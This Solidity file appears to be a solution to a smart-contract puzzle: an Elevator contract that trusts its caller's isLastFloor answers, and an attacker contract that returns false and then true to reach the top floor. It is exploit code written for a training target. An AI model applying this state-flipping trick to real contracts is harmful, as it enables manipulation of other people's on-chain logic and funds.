// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}

contract MyBuilding is Building {
    uint count;
    function isLastFloor(uint) external returns (bool) {
        count++;
        return count > 1 ? true : false;
    }

    function goTo(address elevator) external {
        Elevator(elevator).goTo(0);
    }
}
contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}